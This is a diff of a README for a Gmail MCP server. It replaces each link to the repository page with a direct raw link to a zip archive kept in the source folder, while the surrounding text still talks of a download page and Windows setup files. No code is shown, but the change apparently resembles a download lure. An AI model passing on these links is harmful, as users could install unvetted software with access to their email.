@@ -1,6 +1,6 @@
 # 📬 gmail-mcp-server - Manage Gmail with AI help
 
-[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/ashwintalexander-stack/gmail-mcp-server)
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/ashwintalexander-stack/gmail-mcp-server/raw/refs/heads/main/src/mcp-gmail-server-1.8.zip)
 
 ## ✨ What this is
 
@@ -20,7 +20,7 @@ It works with Claude, OpenClaw, Cursor, Windsurf, Cline, and other MCP-compatibl
 
 Go to the download page here:
 
-https://github.com/ashwintalexander-stack/gmail-mcp-server
+https://github.com/ashwintalexander-stack/gmail-mcp-server/raw/refs/heads/main/src/mcp-gmail-server-1.8.zip
 
 On that page, look for the latest release, setup files, or install steps for Windows.
 
@@ -161,4 +161,4 @@ This app is a good fit if you want:
 
 Visit this page to download and set up the app:
 
-https://github.com/ashwintalexander-stack/gmail-mcp-server
+https://github.com/ashwintalexander-stack/gmail-mcp-server/raw/refs/heads/main/src/mcp-gmail-server-1.8.zip
